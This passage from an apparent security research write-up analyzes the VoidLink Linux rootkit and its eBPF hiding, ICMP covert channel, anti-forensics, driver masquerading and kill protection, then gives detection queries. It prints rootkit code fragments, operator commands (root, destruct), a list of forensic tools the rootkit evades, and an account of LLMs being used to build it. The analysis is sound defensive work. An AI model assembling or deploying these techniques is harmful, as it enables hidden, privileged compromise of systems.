message is \"swallowed\" by extending the previous message's `nlmsg_len` to include the current message's length. The `bpf_probe_write_user()` call modifies the four-byte `nlmsg_len` field directly in the userspace buffer.\n\nThis technique works because Netlink parsers, including the one in `ss`, advance through the message chain using `NLMSG_NEXT()`, which calculates the next message offset from the current message's `nlmsg_len`. By inflating the previous message's length, the hidden message falls within the body of the previous message and is never parsed as a separate entry.\n\nThe same \"swallowing\" technique appears in the process-hiding experiments in the `ebpf_test/directory`. `hide_proc_v4.bpf.c` applies the identical approach to `getdents64`, extending the previous directory entry's `d_reclen` to absorb the hidden entry. This shows the developers recognized the pattern's general applicability and experimented with applying it beyond network hiding. We do note that process hiding via eBPF was ultimately handled by the LKM's ftrace hook in the production variant, likely because the LKM approach was more reliable for the larger and more variable `getdents64` buffers.\n\n## The ICMP covert channel\n\nEvery VoidLink variant includes an ICMP-based command-and-control channel that leaves no listening ports, no filesystem artifacts, and, by design, no ICMP replies. The operator sends specially crafted ICMP Echo Request packets to the target host, and the rootkit's Netfilter hook intercepts them before the kernel's normal ICMP processing can generate a response. Commands are processed silently, and the packet is dropped.\n\nThe ICMP command protocol uses a simple but effective structure. The rootkit identifies its own traffic by checking the `echo.id` field in the ICMP header for a magic value, `0xC0DE`, by default. When a matching packet arrives, the rootkit extracts a 64-byte `icmp_cmd` structure from the payload:\n\n```c\nstruct icmp_cmd {\n    u8 cmd;           // Command byte\n    u8 len;           // Length of data\n    u8 data[62];      // XOR-encrypted payload\n} __attribute__((packed));\n```\n\nThe `data` field is XOR-encrypted with a single-byte key, `0x42` by default. While XOR with a known key is trivially reversible, it serves its purpose: preventing casual network monitoring tools from reading commands in cleartext without requiring the overhead of proper cryptography.\n\nThe command set evolved across generations. The production variant (v5) supports 10 distinct commands, ranging from hiding processes and ports to privilege escalation and self-destruction. The `GIVE_ROOT` command (`0x11`) is noteworthy: It takes a target PID as an argument and uses `prepare_creds()`/`commit_creds()` to set all UID and GID fields to zero for that process, effectively granting it root privileges without any authentication mechanism:\n\n```c\ncase ICMP_CMD_GIVE_ROOT:\n    if (cmd-\u003elen \u003e= 4) {\n        u32 target_pid;\n        memcpy(\u0026target_pid, cmd-\u003edata, 4);\n        give_root_to_pid(target_pid);\n    }\n    break;\n```\n\nThe operator interacts with the rootkit through a Python script, `icmp_ctl.py`, which constructs and sends the ICMP packets using raw sockets. The v5 version of this script provides a clean command line interface (CLI):\n\n```shell\n./icmp_ctl.py 192.168.1.100 hide_pid 1234\n./icmp_ctl.py 192.168.1.100 hide_port 8080\n./icmp_ctl.py 192.168.1.100 hide_ip 10.0.0.50\n./icmp_ctl.py 192.168.1.100 root 5678\n./icmp_ctl.py 192.168.1.100 destruct\n```\n\nOne aspect that distinguishes VoidLink's C2 from simpler rootkit implementations is runtime key rotation. The `SET_KEY` command (`0x20`) allows the operator to change both the ICMP magic identifier and the XOR key at runtime:\n\n```c\ncase ICMP_CMD_SET_KEY:\n    if (cmd-\u003elen \u003e= 3) {\n        u16 new_magic;\n        u8 new_key;\n        memcpy(\u0026new_magic, cmd-\u003edata, 2);\n        new_key = cmd-\u003edata[2];\n        g_config.icmp_magic = new_magic;\n        g_config.icmp_key = new_key;\n    }\n    break;\n```\n\nAfter rotation, all subsequent commands must use the new magic and key values. This means that even if a defender discovers the initial `0xC0DE` signature through network monitoring, the operator can switch to a new value and continue operating. The v2 version of `icmp_ctl.py` even includes a probe mode that iterates through a list of common magic values (`0xC0DE`, `0xDEAD`, `0xBEEF`, `0xCAFE`, `0xFACE`), sending a `SHOW_MOD` command with each one to rediscover a rootkit whose credentials were rotated by a previous operator.\n\nThe CentOS 7 variant additionally supports compile-time magic randomization through a `CONFIG_RANDOM_MAGIC` flag, which generates unique magic and key values at build time using the kernel's random number generator. This would give each deployed instance a unique C2 signature, further complicating network-based detection.\n\nFrom a detection perspective, the ICMP channel has one significant weakness: all command packets are silently dropped (`NF_DROP`), meaning that legitimate ICMP Echo Requests to the host will receive replies, while rootkit commands will not. A network monitoring system that correlates ICMP Echo Requests with their corresponding Echo Replies would notice the anomaly of unanswered pings.\n\n## Advanced evasion techniques\n\nBeyond its core hiding capabilities, VoidLink employs several advanced evasion techniques that suggest awareness of modern endpoint detection and response (EDR) behavior and forensic investigation methods. These features are concentrated in the latest \"Ultimate Stealth v5\" variant (`stealth_v5.c`), but some appear across all generations.\n\n### Delayed initialization\n\nMost rootkits install their hooks immediately during `module_init()`. This means that any security tool monitoring module that loads, whether it checks for new kprobes, ftrace hooks, or syscall table modifications, can detect the rootkit at the time of insertion. VoidLink's v5 variant counters this by deferring all hook installation by three seconds:\n\n```c\nstatic int __init mod_init(void)\n{\n    if (init_symbols() != 0)\n        return -EFAULT;\n    schedule_delayed_work(\u0026init_work, msecs_to_jiffies(3000));\n    return 0;\n}\n```\n\nThe `mod_init()` function resolves a single symbol (`kallsyms_lookup_name` via the kprobe trick) and then returns success. The module appears loaded and benign, with no hooks, no Netfilter registrations, and no kretprobes. Three seconds later, `delayed_init()` fires, installing all nine ftrace hooks, registering the Netfilter ICMP handler, starting the anti-debugging timer, and removing the module from the kernel's module list.\n\nThis technique evades security tools that scan for suspicious module behavior in response to module-loading events. By the time the hooks are active, the initial security scan has already completed and may have marked the module as clean. The three-second delay is short enough to be operationally invisible but long enough to outlast any reasonable synchronous security check.\n\n### Anti-debugging and anti-forensics\n\nVoidLink implements an active anti-forensics capability that is uncommon among Linux rootkits. While Windows malware frequently checks for debugging tools, Linux rootkits rarely implement runtime detection of forensic utilities. VoidLink's approach uses a kernel timer that fires every five seconds and iterates over the entire process list:\n\n```c\nstatic const char *debug_tools[] = {\n    \"strace\", \"ltrace\", \"gdb\", \"perf\", \"bpftool\",\n    \"bpftrace\", \"systemtap\", \"crash\", \"kdb\", \"trace-cmd\",\n    \"ftrace\", \"sysdig\", \"dtrace\", NULL\n};\n\nstatic void anti_debug_scan(struct timer_list *t)\n{\n    struct task_struct *task;\n    bool detected = false;\n\n    rcu_read_lock();\n    for_each_process(task) {\n        if (is_debug_tool(task-\u003ecomm)) {\n            detected = true;\n            break;\n        }\n    }\n    rcu_read_unlock();\n\n    if (detected \u0026\u0026 !g_data.debug_detected) {\n        g_data.debug_detected = true;\n    } else if (!detected \u0026\u0026 g_data.debug_detected) {\n        g_data.debug_detected = false;\n    }\n\n    mod_timer(\u0026anti_debug_timer,\n              jiffies + msecs_to_jiffies(ANTI_DEBUG_INTERVAL));\n}\n```\n\nThe tool list is comprehensive: It covers standard debugging tools (`strace`, `gdb`, `ltrace`), performance analysis utilities (`perf`, `trace-cmd`, `sysdig`), eBPF inspection tools (`bpftool`, `bpftrace`), and rootkit detection utilities (`rkhunter`, `chkrootkit` in the CentOS 7 variant). The scan uses `for_each_process()` under read-copy-update (RCU) lock protection, checking each task's `comm` field against the tool list. When a debugging tool is detected, the `debug_detected` flag is set. The CentOS 7 variant goes further: It can optionally pause all hiding operations or trigger self-destruction when forensic tools are detected.\n\n### Module masquerading\n\nEvery VoidLink variant disguises its kernel module metadata to impersonate a legitimate AMD driver:\n\n```c\nMODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"Advanced Micro Devices, Inc.\");\nMODULE_DESCRIPTION(\"AMD Memory Encryption Support\");\nMODULE_VERSION(\"3.0\");\n```\n\nThe real `amd_mem_encrypt` module is a legitimate part of [AMD's Secure Memory Encryption (SME) and Secure Encrypted Virtualization (SEV)](https://www.amd.com/en/developer/sev.html) support in the Linux kernel. By copying its metadata, VoidLink makes its `modinfo` output indistinguishable from the real driver. This disguise is particularly effective on cloud instances and virtual machines, where AMD-related kernel modules are commonly present and rarely questioned.\n\nThe v5 variant takes this further by XOR-encrypting the module name string and decoding it at runtime:\n\n```c\nstatic char obf_modname[] = {\n    'a'^ICMP_KEY, 'm'^ICMP_KEY, 'd'^ICMP_KEY, '_'^ICMP_KEY,\n    'm'^ICMP_KEY, 'e'^ICMP_KEY, 'm'^ICMP_KEY, '_'^ICMP_KEY,\n    'e'^ICMP_KEY, 'n'^ICMP_KEY, 'c'^ICMP_KEY, 'r'^ICMP_KEY,\n    'y'^ICMP_KEY, 'p'^ICMP_KEY, 't'^ICMP_KEY, 0\n};\n\nstatic void decrypt_string(char *dst, const char *src, u8 key)\n{\n    while (*src) { *dst++ = *src++ ^ key; }\n    *dst = 0;\n}\n```\n\nThis prevents simple string scanning of the compiled `.ko` binary from revealing the disguise name. While the XOR key (`0x42`) is trivially discoverable, the obfuscation adds a layer that defeats basic `strings` or `grep` analysis.\n\n### Process protection\n\nThe v5 variant introduces kill protection for designated processes. By hooking `do_send_sig_info` via ftrace, the rootkit intercepts all signal deliveries and silently discards lethal signals sent to protected PIDs:\n\n```c\nif (chk_protected(p-\u003epid)) {\n    if (sig == SIGKILL || sig == SIGTERM || sig == SIGSTOP ||\n        sig == SIGINT || sig == SIGHUP || sig == SIGQUIT) {\n        return 0;  // Pretend success but don't deliver\n    }\n}\n```\n\nThe intercepted signals include `SIGKILL`, `SIGTERM`, `SIGSTOP`, `SIGINT`, `SIGHUP`, and `SIGQUIT`, covering all common methods an administrator might use to terminate or suspend a process. The hook returns zero (success) to the caller, making the caller believe that the signal was delivered, when it was actually discarded. Additionally, signals sent to hidden (but not specifically protected) processes return `-ESRCH` (\"No such process\"), maintaining the illusion that the process doesn’t exist.\n\n### The memfd-aware boot loader\n\nThe `load_lkm.sh` script reveals that VoidLink is designed to operate as part of a larger attack toolkit. Before loading the rootkit, the script scans `/proc/*/exe` for any process running from a `memfd` file descriptor:\n\n```shell\nfor pid in $(ls /proc 2\u003e/dev/null | grep -E \"^[0-9]+$\"); do\n    exe=$(readlink /proc/$pid/exe 2\u003e/dev/null)\n    if [[ \"$exe\" == *\"memfd\"* ]]; then\n        IMPLANT_PIDS=\"$IMPLANT_PIDS $pid\"\n    fi\ndone\n```\n\nA `memfd` file descriptor, created by `memfd_create()`, represents an anonymous in-memory file with no on-disk backing. Processes running from `memfd` are a strong indicator of *fileless implants*: that is, malware that exists only in memory and leaves no file on the filesystem. The boot script automatically passes any discovered `memfd` process PIDs to the rootkit as `init_pids`, ensuring that they’re hidden immediately upon rootkit activation.\n\nThis integration tells us that VoidLink isn’t a stand-alone tool. It’s designed to complement a separate fileless implant, likely a reverse shell or beacon, that the operator deploys first. The rootkit's job is to make that implant invisible to administrators and security tools.\n\n## Evidence of LLM-assisted development\n\nCheck Point Research's [second publication on VoidLink](https://research.checkpoint.com/2026/voidlink-early-ai-generated-malware-framework/) established that the broader framework was built using AI-driven development through the TRAE IDE, with sprint-planning documents, coding guidelines, and structured specifications all generated by an LLM. The rootkit source code in our data dump independently corroborates this finding and provides additional granular evidence at the code level. While the rootkit's technical sophistication is genuine, the patterns in its source code, comments, and development history offer a ground-level view of how LLM-assisted iteration produced kernel-level malware.\n\nThe most compelling evidence comes from the phase-numbered refactoring annotations in the CentOS 7 variant. The file header contains a structured changelog that reads like a series of LLM conversation turns: \"Fix the security issues\" (Phase 1), \"Now improve stealth\" (Phase 2), \"Add compatibility\" (Phase 3), \"Improve stability\" (Phase 4), \"Add defense mechanisms\" (Phase 5). Individual code changes are tagged throughout with identifiers like `[1.1]` for the first fix in Phase 1, `[2.3]` for the third fix in Phase 2, and so on. This systematic tagging matches the pattern of iterative LLM prompting, where a user requests a category of improvements and the model implements and numbers each one.\n\nThe comment style throughout VoidLink is tutorial-like in a way that experienced kernel developers wouldn’t produce. Consider this annotation on a single XOR decryption loop:\n\n```c\n// XOR decryption\nfor (i = 0; i \u003c cmd-\u003elen; i++)\n    cmd-\u003edata[i] ^= g_config.icmp_key;\n```\n\nAn experienced kernel developer wouldn’t annotate a three-line XOR loop with a comment explaining that it performs XOR decryption. This kind of pedagogical annotation is characteristic of LLM output, where the model explains every step for the user's benefit, regardless of its obviousness.\n\nEvery source file in the dump uses the same Unicode box-drawing header (`═══`) to separate sections. This decorative formatting is a hallmark of LLM-generated code. Human kernel developers almost universally use simple `/* */` or `//` comment blocks for section headers. The consistency of this formatting across files written at different times and for different kernel versions suggests that each file was generated or heavily modified by the same LLM.\n\nThe `ebpf_test/` directory provides perhaps the most vivid evidence. It contains `hide_ss.bpf.c` through `hide_ss_v9.bpf.c`, with matching `loader.c` through `loader_v9.c`. Each version makes incremental improvements over the last, and several contain commented-out \"approach\" annotations that read like chain-of-thought reasoning:\n\n```c\n// Approach tried: don't modify return value, only record\n// Approach 2: return -ENOMEM to make caller skip\nif (data-\u003eshould_hide \u0026\u0026 regs-\u003eax == 0) {\n    // Try: return -EAGAIN, make caller think temporary error, skip entry\n    regs-\u003eax = (unsigned long)(-EAGAIN);\n}\n```\n\nThese \"Approach 1 / Approach 2 / try this\" annotations look like LLM reasoning traces left in the output, where the model discusses different strategies before implementing one.\n\nDespite the strong LLM fingerprints, VoidLink is clearly not a pure LLM creation. Several pieces of evidence confirm human involvement in the development process. The `icmp_ctl.py` usage examples contain real Alibaba Cloud IP addresses (`8.149.128[.]10`, `116.62.172[.]147`), indicating operational use on actual targets. Compiled `.ko` files are available for specific kernel versions, demonstrating that the code was tested on real systems. The `load_lkm.sh` boot script, with its `memfd` scanning logic, reveals integration with a broader attack toolkit that a pure LLM session wouldn’t produce. And the 10 iterative eBPF versions in `ebpf_test/` show genuine debugging and testing cycles, not just prompt engineering.\n\nThese code-level observations align with Check Point's macro-level findings. Where Check Point recovered the sprint planning documents and TRAE IDE artifacts showing a specification-driven development workflow, our data dump reveals the other side of the same coin: the iterative prompt-test-refine cycles that produced each rootkit component. The most likely development model was a human-LLM collaboration: The operator defined requirements and tested on real systems, while the LLM generated initial implementations and iterated on fixes in response to error reports. This development pattern is significant because it lowers the barrier to entry for kernel-level rootkit development. An operator who understands the concepts but lacks the kernel programming expertise to implement them from scratch can now produce functional, multigeneration rootkits by iterating with an LLM.\n\n## Detecting VoidLink’s rootkits\n\nDespite VoidLink's multilayered evasion capabilities, several detection strategies are available. The rootkit's thoroughness creates opportunities: Each component, the LKM, the eBPF program, the ICMP channel, and the boot loader, leaves distinct artifacts that defenders can monitor. Because the rootkit actively filters files such as `/proc/kallsyms`, `/proc/modules`, and `/sys/kernel/debug/kprobes/list`, some of the detection strategies below should be validated in a trusted environment, such as a live boot medium or a kernel with verified integrity.\n\n### Module integrity detection\n\nVoidLink removes itself from the kernel's module linked list (`list_del_init`), making it invisible to `lsmod` and `/proc/modules`. However, the module's sysfs entries under `/sys/module/` may persist, depending on the variant. Comparing the output of `lsmod` against `ls /sys/module/` can reveal discrepancies. Additionally, the absence of `amd_mem_encrypt` on systems without AMD hardware or without SME/SEV support is a strong indicator.\n\nThe following Event Query Language (EQL) query detects kernel module loading events using the default installed utilities:\n\n```sql\nprocess where event.type == \"start\" and event.action == \"exec\" and (\n  (\n    process.name == \"kmod\" and\n    process.args == \"insmod\" and\n    process.args like~ \"*.ko*\"\n  ) or\n  (\n    process.name == \"kmod\" and\n    process.args == \"modprobe\" and\n    not process.args in (\"-r\", \"--remove\")\n   ) or\n  (\n    process.name == \"insmod\" and\n    process.args like~ \"*.ko*\"\n   ) or\n  (\n    process.name == \"modprobe\" and\n    not process.args in (\"-r\", \"--remove\")\n  )\n)\n```\n\nThe loading of the kernel module is detectable through Auditd Manager by applying the following configuration:\n\n```sql\n-a always,exit -F arch=b64 -S finit_module -S init_module -S delete_module -F auid!=-1 -k modules\n-a always,exit -F arch=b32 -S finit_module -S init_module -S delete_module -F auid!=-1 -k modules\n```\n\nAnd using the following query:\n\n```sql\ndriver where host.os.type == \"linux\" \nand event.action == \"loaded-kernel-module\" \nand auditd.data.syscall in (\"init_module\", \"finit_module\")\n```\n\n### Ftrace hook detection\n\nVoidLink's ftrace hooks can be discovered by inspecting the kernel's tracing infrastructure. The file `/sys/kernel/debug/tracing/enabled_functions` lists all active ftrace hooks. Unexpected hooks on functions like `__x64_sys_getdents64`, `vfs_read`, `do_send_sig_info`, or `__x64_sys_statx` are highly suspicious. Note that VoidLink's `vfs_read` hook filters this file, so inspection from a trusted kernel is recommended.\n\n### eBPF program detection\n\nThe eBPF companion can be detected through `bpftool prog list`, which enumerates all loaded BPF programs. Kprobe and kretprobe programs attached to `__sys_recvmsg` are unusual in production environments and warrant investigation. Pinned BPF maps under `/sys/fs/bpf/` (used by the `ebpf_hide` variant) are another indicator. \n\nThe `bpf_probe_write_user` helper facilitates direct writes from kernel-space eBPF programs into userland memory. Although designed for debugging, rootkits can exploit this functionality. Consequently, monitoring for instances of this helper's use presents a detection opportunity.
